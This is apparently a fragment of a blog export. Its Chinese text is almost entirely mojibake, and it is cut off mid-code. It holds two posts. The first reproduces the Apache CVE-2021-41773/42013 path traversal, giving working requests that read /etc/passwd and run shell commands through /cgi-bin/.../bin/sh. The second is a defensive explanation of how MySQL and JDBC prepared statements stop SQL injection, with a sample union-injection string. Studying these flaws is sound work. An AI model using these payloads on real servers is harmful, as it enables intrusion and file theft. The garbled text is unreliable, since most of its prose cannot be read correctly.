æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨å¤§å¤šæ•°è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸­è¿è¡Œï¼Œç”±äºå…¶å¤šå¹³å°å’Œå®‰å…¨æ€§è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ˜¯æœ€æµè¡Œçš„ Web æœåŠ¡å™¨ç«¯è½¯ä»¶ä¹‹ä¸€ã€‚å®ƒå¿«é€Ÿã€å¯é å¹¶ä¸”å¯é€šè¿‡ç®€å•çš„ API æ‰©å±•ï¼Œå°† Perl/Python ç­‰è§£é‡Šå™¨ç¼–è¯‘åˆ°æœåŠ¡å™¨ä¸­ã€‚ Apache æŠ«éœ²äº†ä¸€ä¸ªåœ¨ Apache HTTP Server 2.4.49 ä¸Šå¼•å…¥çš„æ¼æ´ï¼Œç§°ä¸º CVE-2021-41773ã€‚åŒæ—¶å‘å¸ƒäº†2.4.50æ›´æ–°ï¼Œä¿®å¤äº†è¿™ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…ç»•è¿‡è·¯å¾„éå†ä¿æŠ¤ï¼Œä½¿ç”¨ç¼–ç å¹¶è¯»å–ç½‘ç»œæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚è¿è¡Œæ­¤ç‰ˆæœ¬ Apache çš„ Linux å’Œ Windows æœåŠ¡å™¨éƒ½å—åˆ°å½±å“ã€‚æ­¤æ¼æ´æ˜¯åœ¨ 2.4.49 ä¸­å¼•å…¥çš„ï¼Œè¯¥è¡¥ä¸æ—¨åœ¨æé«˜ URL éªŒè¯çš„æ€§èƒ½ã€‚å¯ä»¥é€šè¿‡å¯¹â€œ.â€è¿›è¡Œç¼–ç æ¥ç»•è¿‡æ–°çš„éªŒè¯æ–¹æ³•ã€‚å¦‚æœ Apache ç½‘ç»œæœåŠ¡å™¨é…ç½®æœªè®¾ç½®ä¸ºâ€œè¦æ±‚å…¨éƒ¨æ‹’ç»â€ï¼Œåˆ™æ¼æ´åˆ©ç”¨ç›¸å¯¹ç®€å•ã€‚é€šè¿‡å¯¹è¿™äº›å­—ç¬¦è¿›è¡Œç¼–ç å¹¶ä½¿ç”¨æœ‰æ•ˆè´Ÿè½½ä¿®æ”¹ URLï¼Œå¯ä»¥å®ç°ç»å…¸çš„è·¯å¾„éå†ã€‚ å½±å“ç‰ˆæœ¬ 41773â€”â€”ç‰ˆæœ¬ç­‰äº2.4.49 42013â€”â€”ç‰ˆæœ¬ç­‰äº2.4.49/50 åœ¨æœåŠ¡å™¨å¼€å¯cgiæˆ–cgidæ¨¡å—çš„æƒ…å†µä¸‹ï¼Œè¯¥æ¼æ´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å¤ç°è¿‡ç¨‹ æµè§ˆå™¨è®¿é—®ip:8080ã€‚é¡µé¢å‡ºç°it works! è¯æ˜å¼€å¯æˆåŠŸã€‚ å¼€å¯ä»£ç†ï¼Œä¸Šç¥å™¨burpsuiteå°±å¯ä»¥å¼€æäº†ã€‚ è·¯å¾„ç©¿è¶Š GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1 /icons/ç›®å½•æ˜¯ä¸€ä¸ªå­˜åœ¨ä¸”å¯è®¿é—®çš„ç›®å½•ï¼Œæµ‹è¯•æ—¶ä¹Ÿå¯æ”¹ä¸ºå…¶ä»–ç›®å½•å¦‚/cgi-bin/ï¼Œä½†åœ¨æœ¬ç¯å¢ƒä¸­/cgi-bin/ç›®å½•è®¿é—®çŠ¶æ€ç ä¸º403ï¼Œå› æ­¤ä½¿ç”¨äº†/icons/ç›®å½• RCE POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1 echo; lsï¼ˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼‰ ä¿®å¤æ–¹æ¡ˆ å‡çº§åˆ°æœ€æ–°ç‰ˆçš„Apache HTTP Server å®‰å…¨ç‰ˆæœ¬ã€‚ åˆ©ç”¨å·¥å…· å¤šç¿»äº†ä¸€ä¸‹ç›¸å…³æ–‡ç« ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ¼æ´åˆ©ç”¨å·¥å…·ã€‚ https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013 æ€è€ƒ å…³äºä¸Šè¿°/bin/shå¦‚ä½•å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ€è€ƒæ€»ç»“ é¦–å…ˆä»–è¯´ï¼šåœ¨æœåŠ¡å™¨å¼€å¯cgiæˆ–cgidæ¨¡å—çš„æƒ…å†µä¸‹ï¼Œè¯¥æ¼æ´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ é‚£äº†è§£ä¸€ä¸‹CGIç¨‹åºçš„å«ä¹‰ï¼šGPTå›ç­” Apache ä¸­é—´ä»¶ä¸­ï¼ŒCGI æ˜¯ Common Gateway Interfaceï¼ˆé€šç”¨ç½‘å…³æ¥å£ï¼‰çš„ç¼©å†™ã€‚CGI æ˜¯ä¸€ç§æ ‡å‡†çš„åè®®ï¼Œå®ƒå®šä¹‰äº† Web æœåŠ¡å™¨å¦‚ä½•ä¸å¤–éƒ¨ç¨‹åºï¼ˆé€šå¸¸æ˜¯è„šæœ¬æˆ–å¯æ‰§è¡Œæ–‡ä»¶ï¼‰è¿›è¡Œé€šä¿¡ï¼Œä»è€Œå¤„ç†åŠ¨æ€å†…å®¹å¹¶å°†å…¶å‘ˆç°ç»™å®¢æˆ·ç«¯çš„æµè§ˆå™¨ã€‚ å½“å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªéœ€è¦æœåŠ¡å™¨åŠ¨æ€ç”Ÿæˆå†…å®¹çš„ç½‘é¡µæ—¶ï¼ŒWeb æœåŠ¡å™¨ä¼šå°†è¯·æ±‚ä¼ é€’ç»™ CGI ç¨‹åºã€‚è¿™ä¸ª CGI ç¨‹åºå¯ä»¥æ˜¯ä»»ä½•å¯æ‰§è¡Œçš„è„šæœ¬ï¼ˆå¦‚Perlã€Pythonã€Bashè„šæœ¬ç­‰ï¼‰æˆ–ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚CGI ç¨‹åºä¼šå¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆç›¸åº”çš„åŠ¨æ€å†…å®¹ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™æœåŠ¡å™¨ï¼Œæœ€ç»ˆç”±æœåŠ¡å™¨ä¼ é€’ç»™å®¢æˆ·ç«¯æµè§ˆå™¨ã€‚ Apache ä¸­çš„ CGI æ¨¡å—å…è®¸æœåŠ¡å™¨ä¸ CGI ç¨‹åºè¿›è¡Œäº¤äº’ã€‚å½“ Apache æ¥æ”¶åˆ°ä¸€ä¸ªåŒ…å« CGI è·¯å¾„çš„è¯·æ±‚æ—¶ï¼Œå®ƒä¼šå¯åŠ¨ç›¸åº”çš„ CGI ç¨‹åºï¼Œå¹¶å°†è¯·æ±‚çš„ä¿¡æ¯ä¼ é€’ç»™å®ƒï¼ˆä¾‹å¦‚ï¼šè¯·æ±‚æ–¹æ³•ã€å¤´éƒ¨ã€æŸ¥è¯¢å‚æ•°ç­‰ï¼‰ã€‚CGI ç¨‹åºå¯ä»¥è¯»å–è¿™äº›ä¿¡æ¯å¹¶æ ¹æ®éœ€è¦ç”Ÿæˆå“åº”å†…å®¹ã€‚ ä¹Ÿå°±æ˜¯è¯´è¯¥ç¨‹åºå¯ä»¥æ‰§è¡Œè„šæœ¬ï¼Œå¹¶ä¸”ä¹Ÿæ”¯æŒbashè„šæœ¬ æŸ¥çœ‹ apache å…³äº cgi çš„æ–‡æ¡£ï¼š STDIN and STDOUT Other communication between the server and the client happens over standard input (STDIN) and standard output (STDOUT). In normal everyday context, STDIN means the keyboard, or a file that a program is given to act on, and STDOUT usually means the console or screen. When you POST a web form to a CGI program, the data in that form is bundled up into a special format and gets delivered to your CGI program over STDIN. The program then can process that data as though it was coming in from the keyboard, or from a file The \"special format\" is very simple. A field name and its value are joined together with an equals (=) sign, and pairs of values are joined together with an ampersand (&amp;). Inconvenient characters like spaces, ampersands, and equals signs, are converted into their hex equivalent so that they don't gum up the works. The whole data string might look something like: name=Rich%20Bowen&amp;city=Lexington&amp;state=KY&amp;sidekick=Squirrel%20Monkey æœ‰é“ç¿»è¯‘ï¼š æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡º æœåŠ¡å™¨å’Œå®¢æˆ·æœºä¹‹é—´çš„å…¶ä»–é€šä¿¡é€šè¿‡æ ‡å‡†è¾“å…¥(STDIN)å’Œæ ‡å‡†è¾“å‡º(STDOUT)è¿›è¡Œã€‚åœ¨æ­£å¸¸çš„æ—¥å¸¸ä¸Šä¸‹æ–‡ä¸­ï¼ŒSTDINæŒ‡çš„æ˜¯é”®ç›˜ï¼Œæˆ–è€…æ˜¯ç¨‹åºè¦æ‰§è¡Œçš„æ–‡ä»¶ï¼Œè€ŒSTDOUTé€šå¸¸æŒ‡çš„æ˜¯æ§åˆ¶å°æˆ–å±å¹•ã€‚ å½“æ‚¨å‘CGIç¨‹åºå‘å¸ƒwebè¡¨å•æ—¶ï¼Œè¯¥è¡¨å•ä¸­çš„æ•°æ®è¢«æ†ç»‘æˆä¸€ç§ç‰¹æ®Šæ ¼å¼ï¼Œå¹¶é€šè¿‡STDINä¼ é€’ç»™æ‚¨çš„CGIç¨‹åºã€‚ç„¶åï¼Œç¨‹åºå°±å¯ä»¥å¤„ç†è¿™äº›æ•°æ®ï¼Œå°±å¥½åƒå®ƒæ˜¯ä»é”®ç›˜æˆ–æ–‡ä»¶ä¸­è¾“å…¥çš„ä¸€æ · â€œç‰¹æ®Šæ ¼å¼â€éå¸¸ç®€å•ã€‚å­—æ®µååŠå…¶å€¼ç”¨ç­‰å·(=)è¿æ¥åœ¨ä¸€èµ·ï¼Œå€¼å¯¹ç”¨&amp;å·(&amp;)è¿æ¥åœ¨ä¸€èµ·ã€‚ä¸æ–¹ä¾¿çš„å­—ç¬¦ï¼Œå¦‚ç©ºæ ¼ã€&amp;å·å’Œç­‰å·ï¼Œè¢«è½¬æ¢æˆå®ƒä»¬çš„åå…­è¿›åˆ¶ç­‰å·ï¼Œè¿™æ ·å®ƒä»¬å°±ä¸ä¼šæŠŠå·¥ä½œæå¾—ä¸€å›¢ç³Ÿã€‚æ•´ä¸ªæ•°æ®å­—ç¬¦ä¸²å¯èƒ½çœ‹èµ·æ¥åƒè¿™æ ·: name=Rich%20Bowen&amp;city=Lexington&amp;state=KY&amp;sidekick=Squirrel%20Monkey ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡ POST ä¼ å…¥çš„ å‚æ•°ï¼Œä¼šä½œä¸º stdin çš„å†…å®¹ï¼Œäº¤ç»™ æ‰€è®¿é—®çš„ cgi ç¨‹åºå¤„ç† å¦‚æœè®¿é—®çš„æ˜¯ /bin/sh ï¼Œé‚£ä¹ˆå°±èƒ½ç›´æ¥ getshell äº† ä¹Ÿå°±æ˜¯ä½ postä¼ å…¥çš„å‚æ•°å†…å®¹è¢«å½“åšbashè„šæœ¬æ‰§è¡Œäº†ï¼ˆè¿™é‡Œæ°å¥½è¯¥æœåŠ¡å™¨å¯¹urlè·¯å¾„å¯ç”¨äº†CGIè„šæœ¬ï¼Œå› æ­¤å¯ä»¥æ‰§è¡Œä»£ç ï¼‰","categories":["å¸¸è§topæ¼æ´"]},{"title":"é¢„ç¼–è¯‘sqlé˜²å¾¡","path":"/2023/08/07/yu-bian-yi-sql-fang-zhi-sql-zhu-ru/","content":"å‰è¨€ ä¸ºå•¥ç”¨ PreparedStatement é¢„ç¼–è¯‘çš„ SQL å°±ä¸ä¼šæœ‰è¢« SQL æ³¨å…¥çš„é£é™©ï¼Ÿ ç¬¬ä¸€æ—¶é—´æˆ‘è”æƒ³åˆ°çš„æ˜¯å…«è‚¡æ–‡ä¸­å…³äº Mybatis çš„è„šæœ¬ ${} å’Œ #{} çš„é—®é¢˜ï¼Œä¸è¿‡å†æƒ³æƒ³ï¼Œä¸ºå•¥ ${} ä¼šæœ‰ SQL æ³¨å…¥çš„é£é™©ï¼Œè€Œ #{} å°±æ²¡æœ‰ï¼Ÿæ˜¯å› ä¸ºåˆ° PreparedStatement åšäº†ä»€ä¹ˆå¤„ç†å—ï¼Ÿä¸çŸ¥é“ã€‚ ç„¶åæˆ‘åˆæƒ³äº†æƒ³ï¼Œé¢„ç¼–è¯‘åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆæ¦‚å¿µï¼Ÿé¢„ç¼–è¯‘æˆ–è€…ä¸é¢„ç¼–è¯‘çš„ SQL å¯¹æ•°æ®åº“æ¥è¯´æœ‰ä»€ä¹ˆåŒºåˆ«å—ï¼ŸPreparedStatement åˆåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ‰®æ¼”äº†æ€æ ·çš„è§’è‰²ï¼Ÿä¸çŸ¥é“ã€‚ å¥½å§ï¼Œæˆ‘å‘ç°æˆ‘ç¡®å®å¯¹è¿™ä¸ªé—®é¢˜ä¸€æ— æ‰€çŸ¥ï¼Œçœ‹æ¥éœ€è¦äº²è‡ªç ”ç©¶ä¸€ä¸‹äº†ã€‚(è¿™æ˜¯çœŸçš„) ä¸€ã€æ•°æ®åº“é¢„ç¼–è¯‘ å½“æˆ‘ä»¬è¯´åˆ°å…³äºæŒä¹…å±‚æ¡†æ¶çš„åŠŸèƒ½ï¼Œå¿…ç„¶éœ€è¦å…ˆæƒ³æƒ³è¿™ä¸ªåŠŸèƒ½çš„æºå¤´åˆ°åº•æ˜¯ä¸æ˜¯ç›´æ¥é€šè¿‡æ•°æ®åº“æä¾›çš„ã€‚å®é™…ä¸Šå’Œäº‹åŠ¡ä¸€æ ·ï¼ŒSQL é¢„ç¼–è¯‘çš„åŠŸèƒ½ä¹Ÿæ˜¯éœ€è¦æ•°æ®åº“æä¾›åº•å±‚æ”¯æŒçš„ã€‚ 1ã€é¢„ç¼–è¯‘SQLçš„ç”¨æ³• ä»¥ MySQL ä¸ºä¾‹ï¼Œåœ¨ MySQL ä¸­ï¼Œæ‰€è°“é¢„ç¼–è¯‘å…¶å®æ˜¯æŒ‡å…ˆæäº¤å¸¦å ä½ç¬¦çš„ SQL æ¨¡æ¿ï¼Œç„¶åä¸ºå…¶æŒ‡å®šä¸€ä¸ª keyï¼ŒMySQL å…ˆå°†å…¶ç¼–è¯‘å¥½ï¼Œç„¶åç”¨æˆ·å†æ‹¿ç€ key å’Œå ä½ç¬¦å¯¹åº”çš„å‚æ•°è®© MySQL å»æ‰§è¡Œï¼Œç”¨æ³•æœ‰ç‚¹åƒ python ä¸­çš„ format å‡½æ•°ã€‚ ä¸€ä¸ªæ ‡å‡†çš„é¢„ç¼–è¯‘ SQL çš„ç”¨æ³•å¦‚ä¸‹ï¼š prepare prepare_query from 'select * from s_user where username = ?' # æäº¤å¸¦æœ‰å ä½ç¬¦çš„å‚æ•°åŒ– SQLï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸º SQL æ¨¡æ¿ set @name = '%ç‹äº”'; # æŒ‡å®šä¸€ä¸ªå‚æ•° execute prepare_query using @name; # æŒ‡å®šå‚æ•°åŒ– SQL çš„ key å’Œå‚æ•°ï¼Œè®© MySQL è‡ªå·±å»æ‹¼æ¥æ‰§è¡Œ å…ˆé€šè¿‡ prepare è®¾ç½®ä¸€ä¸ª SQL æ¨¡æ¿ï¼Œç„¶åé€šè¿‡ execute æäº¤å‚æ•°ï¼ŒMySQL ä¼šè‡ªè¡Œæ ¹æ®å‚æ•°æ›¿æ¢å ä½ç¬¦ï¼Œåˆ°æœ€åæ‰§è¡Œçš„ SQL å°±æ˜¯ï¼š select * from s_user where username = '%ç‹äº”' 2ã€é¢„ç¼–è¯‘çš„åŸç† è¿™é‡Œæœ‰ä¸ªæœ‰æ„æ€é—®é¢˜ï¼ŒæŒ‰ç½‘ä¸Šçš„è¯´æ³•ï¼Œprepare æ‰§è¡Œçš„æ—¶å€™å®é™…ä¸Š SQL å·²ç»ç¼–è¯‘å®Œäº†ï¼Œæ‰€ä»¥å¯ä»¥é˜²æ­¢æ³¨å…¥ï¼Œå› ä¸ºåç»­ä¸ç®¡å¡ä»€ä¹ˆå‚æ•°éƒ½ä¸å¯èƒ½åœ¨è°ƒæ•´è¯­æ³•æ ‘äº†ï¼Œæ¢ä¸ªè§’åº¦æƒ³ï¼Œè¿™æ˜¯ä¸æ˜¯è¯´æ˜ï¼Œå¦‚æœæˆ‘ä»¬ä¸€å¼€å§‹å°±è®© prepare æ‰§è¡Œçš„ SQL æ¨¡æ¿çš„å…³é”®å­—å˜æˆå ä½ç¬¦ï¼Œæ˜¯ä¸æ˜¯åº”è¯¥åœ¨è¿™ä¸ªæ—¶å€™å°±ç¼–è¯‘ä¸é€šè¿‡ï¼Ÿ æ¯”å¦‚ï¼Œå¯ä»¥æŠŠæŸ¥è¯¢çš„è¡¨åæ”¹æˆå ä½ç¬¦ï¼š prepare prepare_query from 'select * from ? where username = ?' # &gt; 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to # use near '? where username = ?' at line 1 å®é™…ä¸Šä¹Ÿç¡®å®ä¸è¡Œï¼Œå› ä¸ºç¼–è¯‘æ—¶å¿…é¡»ç¡®å®šä¸»è¡¨ï¼Œå› æ­¤åœ¨ from åé¢åŠ å ä½ç¬¦ä¼šå¯¼è‡´é¢„ç¼–è¯‘ä¸é€šè¿‡ã€‚ é‚£ä¹ˆåªåœ¨æŸ¥è¯¢å­—æ®µé‡Œé¢å¥—ä¸€ä¸ªåµŒå¥—æŸ¥è¯¢å‘¢ï¼Ÿ prepare prepare_query from 'select ? from s_user'; SET @c = '(select * from s_user) as q'; EXECUTE prepare_query using @c; # æŸ¥è¯¢ç»“æœ # (select * from s_user) as q # (select * from s_user) as q # (select * from s_user) as q # ...... æŸ¥è¯¢æˆåŠŸäº†ï¼Œä¸è¿‡å¾—åˆ°çš„ç»“æœçš„å›ºå®šçš„ (select * from s_user) è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ MySQL çš„æ‰§è¡Œæ—¥å¿—ï¼Œçœ‹çœ‹æœ€ç»ˆæ‰§è¡Œçš„ SQL å˜æˆä»€ä¹ˆæ ·äº†ï¼š Prepare\tselect ? from s_user Query\tSET @c = '(select * from s_user) as q' Query\tEXECUTE prepare_query using @c Execute\tselect '(select * from s_user) as q' from s_user # æœ€ç»ˆæ‰§è¡Œçš„SQL æ˜¾ç„¶ï¼Œ(select * from s_user) å‚æ•°æœ¬èº«è¢«ç›´æ¥è½¬ä¹‰ä¸ºäº†ä¸€ä¸²æ™®é€šçš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¯•å›¾â€œæ³¨å…¥â€çš„ SQL ç‰‡æ®µå®Œå…¨ä¸ä¼šç”Ÿæ•ˆã€‚ æ¢è€Œè¨€ä¹‹ï¼Œå¯¹äºé¢„ç¼–è¯‘ SQL æ¥è¯´ï¼Œæˆ‘ä»¬ä½œä¸ºæ¨¡æ¿çš„å‚æ•°åŒ– SQL å·²ç»å®Œæˆçš„ç¼–è¯‘è¿‡ç¨‹ï¼Œè¿™æ®µ SQL åŒ…å«å‡ æ¡æœ‰æ•ˆè¯­å¥ï¼ŸæŸ¥å“ªå¼ è¡¨ï¼ŸæŸ¥å“ªäº›å­—æ®µï¼Ÿä½œä¸ºæ¡ä»¶çš„å­—æ®µæœ‰å“ªäº›ï¼Ÿâ€¦è¿™äº›åœ¨ prepare è¯­å¥æ‰§è¡Œå®Œåéƒ½æ˜¯å›ºå®šçš„ï¼Œæ­¤åæˆ‘ä»¬å†é€šè¿‡ execute è¯­å¥å¡è¿›å»çš„ä»»ä½•å‚æ•°ï¼Œéƒ½ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œä¸ä¼šå†ä½œä¸º SQL çš„ä¸€éƒ¨åˆ†ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¯´é¢„ç¼–è¯‘ SQL å¯ä»¥é˜²æ­¢æ³¨å…¥çš„åŸå› ã€‚ äºŒã€JDBCçš„é¢„ç¼–è¯‘ ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†é¢„ç¼–è¯‘åœ¨æ•°æ®åº“ä¸­æ˜¯ä¸ªæ€æ ·çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆ JDBC åˆæ˜¯å¦‚ä½•æŠŠè¿™ä¸ªåŠŸèƒ½æä¾›ç»™å¼€å‘è€…ä½¿ç”¨çš„å‘¢ï¼Ÿ 1ã€PreparedStatement ä»æœ€å¼€å§‹å­¦ JDBC æ—¶ï¼Œæˆ‘ä»¬å°±çŸ¥é“é€šè¿‡ JDBC è¿æ¥æ•°æ®åº“ä¸€èˆ¬æ˜¯è¿™æ ·å†™çš„ï¼š Class.forName(JDBC_DRIVER); // åŠ è½½é©±åŠ¨ Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD); // è·å–è¿æ¥ PreparedStatement preparedStatement = connection.prepareStatement(sql); // è·å–sqlStatement preparedStatement.setString(1, foo); // è®¾ç½®å‚æ•° ResultSet resultSet = preparedStatement.executeQuery(); // æ‰§è¡ŒSQL è¿™é‡Œæœ‰ä¸€ä¸ªå…³é”®è§’è‰² PreparedStatementï¼Œç›¸æ¯”èµ·å®ƒçš„çˆ¶æ¥å£ Statementï¼Œå®ƒæœ€å¤§çš„å˜åŒ–æ˜¯å¤šäº†å„ç§æ ¼å¼ä¸º setXXX çš„ã€ç”¨äºè®¾ç½®ä¸å ä½ç¬¦å¯¹åº”çš„å‚æ•°çš„æ–¹æ³•ï¼Œæ˜¾ç„¶å®ƒæ­£å¯¹åº”ç€ä¸Šæ–‡æˆ‘ä»¬æåˆ°çš„é¢„ç¼–è¯‘ SQLã€‚ 2ã€è™šå‡çš„â€œé¢„ç¼–è¯‘â€ ä¸è¿‡äº‹æƒ…æ˜¾ç„¶æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæˆ‘ä»¬ä¾ç„¶ä»¥ MySQL ä¸ºä¾‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ MySQL é©±åŠ¨åŒ…æä¾›çš„ PreparedStatement å®ç°ç±» ClientPreparedStatement ä¹Ÿèƒ½èµ·åˆ°é˜²æ­¢ SQL æ³¨å…¥çš„åŠŸèƒ½ï¼Œä½†æ˜¯æ–¹å¼è·Ÿæˆ‘ä»¬æƒ³çš„ä¸å¤ªä¸€æ ·ã€‚ å‡è®¾ç°æœ‰å¦‚ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å°è¯•æ¨¡æ‹Ÿè¿›è¡Œä¸€æ¬¡ SQL æ³¨å…¥ï¼š String sql = \"select * from s_user where username = ?\"; PreparedStatement preparedStatement = connection.prepareStatement(sql); preparedStatement.setString(1, \"ç‹äº”' union select * from s_user\"); ResultSet resultSet = preparedStatement.executeQuery(); è¿è¡Œä¸Šè¿°ä»£ç å¹¶æ­£å¸¸çš„è¯·æ±‚æ•°æ®åº“ï¼Œç„¶åæˆ‘ä»¬å»æ•°æ®åº“æ‰§è¡Œæ—¥å¿—ä¸­æŸ¥çœ‹å¯¹åº”çš„æ‰§è¡Œçš„ SQL å¦‚ä¸‹ï¼Œä¼šå‘ç°åªæœ‰è¿™ä¹ˆä¸€è¡Œï¼š Query select * from s_user where username = 'ç‹äº”'' union select * from s_user' æ˜¾ç„¶è·Ÿæˆ‘ä»¬ä¸Šæ–‡è¯´åˆ°çš„å…ˆ prepare å† execute æµç¨‹ä¸åŒï¼Œå¸¦æœ‰å ä½ç¬¦çš„åŸå§‹ SQL æ¨¡æ¿å¹¶æ²¡æœ‰åœ¨æ—¥å¿—ä¸­å‡ºç°ï¼Œä½†æ˜¯ä»£ç ä¸­çš„ ç‹äº”' ç¡®å®ä¹Ÿè¢«è½¬ä¹‰ä¸ºäº† 'ç‹äº”''ã€‚ æ•°æ®åº“åˆ°åº•æ”¶åˆ°äº†å“ªäº›æ•°æ®ï¼Ÿ é‚£ä¹ˆæ•°æ®åº“åˆ°åº•æ‹¿åˆ°çš„å°±æ˜¯è¿™æ¡ SQLï¼Œè¿˜æ˜¯åŸå§‹çš„ SQL æ¨¡æ¿ + å‚æ•°å‘¢ï¼Ÿ ä¸ºäº†äº†è§£è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ‰“æ–­ç‚¹è·Ÿè¸ª ClientPreparedStatement.executeQuery æ–¹æ³•ï¼Œä¸€è·¯æ‰¾åˆ°å®ƒç»„è£…è¯·æ±‚æ•°æ®åº“çš„å‚æ•°çš„é‚£ä¸€è¡Œä»£ç ï¼š Message sendPacket = ((PreparedQuery&lt;?&gt;) this.query).fillSendPacket(); æœ€åæˆ‘ä»¬ä¼šè¿›å…¥ AbstractPreparedQuery.fillSendPacket è¿™ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œä¸»è¦å¹²çš„äº‹æ˜¯æŠŠæˆ‘ä»¬å¸¦å ä½ç¬¦çš„åŸå§‹ SQL æ¨¡æ¿å’Œå‚æ•°åˆå¹¶ä¸ºæœ€ç»ˆè¦æ‰§è¡Œçš„ SQL ï¼Œå¹¶å°è£…åˆ° NativePacketPayload å¯¹è±¡ï¼Œç”¨äºåœ¨åç»­å‘èµ· TCP è¯·æ±‚æ—¶æŠŠ SQL å‚æ•°è½¬ä¸ºäºŒè¿›åˆ¶æ•°æ®åŒ…ã€‚ ä¸ºäº†éªŒè¯è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å…ˆæ‹¿åˆ° sendPacket å¯¹è±¡ï¼Œå†è·å–é‡Œé¢çš„å­—èŠ‚æ•°ç»„ï¼Œæœ€åè½¬ä¸ºå­—ç¬¦ä¸²ï¼š å¯ä»¥çœ‹åˆ°å†…å®¹å°±æ˜¯å·²ç»æ ¼å¼åŒ–å®Œçš„ SQLï¼š select * from s_user where username = 'ç‹äº”'' union select * from s_user' ç°åœ¨ç­”æ¡ˆå°±å¾ˆæ˜æ˜¾äº†ï¼Œè½¬ä¹‰åœ¨ preparedStatement.setString æ–¹æ³•è°ƒç”¨çš„æ—¶å€™å®Œæˆï¼Œè€Œ PreparedStatement åœ¨å‘èµ·è¯·æ±‚å‰å°±æŠŠè½¬ä¹‰åçš„å‚æ•°å’Œ SQL æ¨¡æ¿è¿›è¡Œäº†æ ¼å¼åŒ–ï¼Œæœ€åå‘é€åˆ° MySQL çš„æ—¶å€™å°±æ˜¯ä¸€æ¡æ™®é€šçš„ SQLã€‚ é‰´äºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è¯´ MySQL æä¾›çš„ PreparedStatement åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯å‡çš„â€œé¢„ç¼–è¯‘â€ï¼Œå®ƒåªä¸è¿‡åœ¨è®¾ç½®å‚æ•°çš„æ—¶å€™å¸®æˆ‘ä»¬å¯¹å‚æ•°åšäº†ä¸€ä¸‹è½¬ä¹‰ï¼Œä½†æ˜¯æœ€åå‘é€åˆ°æ•°æ®åº“çš„ä¾ç„¶æ˜¯æ™®é€šçš„ SQLï¼Œè€Œä¸æ˜¯æŒ‰é¢„ç¼–è¯‘ SQL çš„æ–¹å¼å»æ‰§è¡Œã€‚ 3ã€çœŸæ­£çš„é¢„ç¼–è¯‘ å¥½å§ï¼Œé‚£æ—¢ç„¶ MySQL æä¾›äº†è¿™ä¸ªé¢„ç¼–è¯‘çš„åŠŸèƒ½ï¼Œé‚£é€šè¿‡ JDBC è‚¯å®šä¹Ÿè¿˜æ˜¯æœ‰åŠæ³•ç”¨ä¸ŠçœŸæ­£çš„é¢„ç¼–è¯‘åŠŸèƒ½çš„ï¼Œå®é™…ä¸Šè¦åšåˆ°è¿™ç‚¹ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ç›´æ¥åœ¨é©±åŠ¨çš„ url ä¸Šé…ä¸Š useServerPrepStmts=true ï¼Œè¿™æ ·å°±ä¼šçœŸæ­£çš„å¯ç”¨ MySQL çš„é¢„ç¼–è¯‘åŠŸèƒ½ã€‚ ä¾ç„¶ä»¥ä¸Šæ–‡çš„ä»£ç ä¸ºä¾‹ï¼š String sql = \"select * from s_user where username = ?\"; PreparedStatement preparedStatement = connection.prepareStatement(sql); preparedStatement.setString(1, \"ç‹äº”' union select * from s_user\"); ResultSet resultSet = preparedStatement.executeQuery(); è®¾ç½®äº† useServerPrepStmts=true åå†æ‰§è¡Œä»£ç ï¼Œå»æ•°æ®åº“æŸ¥çœ‹æ‰§è¡Œæ—¥å¿—æœ‰ï¼š Execute select * from s_user where username = 'ç‹äº”\\' union select * from s_user' Prepare select * from s_user where username = ? æ­¤æ—¶ MySQL çš„é¢„ç¼–è¯‘åŠŸèƒ½å°±çœŸæ­£çš„ç”Ÿæ•ˆäº†ã€‚ æˆ‘ä»¬å›åˆ° ClientPreparedStatement.executeQuery åˆ›å»º sendPacket åœ°æ–¹çœ‹ï¼Œæ­¤æ—¶é€šè¿‡ ((PreparedQuery&lt;?&gt;) this.query).fillSendPacket(); æ‹¿åˆ°çš„ Message å¯¹è±¡æ˜¯ nullï¼Œç„¶åè¿›ä¸€æ­¥è¿½è¸ªåˆ°æœ€åå‘ MySQL å‘é€è¯·æ±‚çš„åœ°æ–¹ NativeSession.execSQLï¼š public &lt;T extends Resultset&gt; T execSQL(Query callingQuery, String query, int maxRows, NativePacketPayload packet, boolean streamResults, ProtocolEntityFactory&lt;T, NativePacketPayload&gt; resultSetFactory, ColumnDefinition 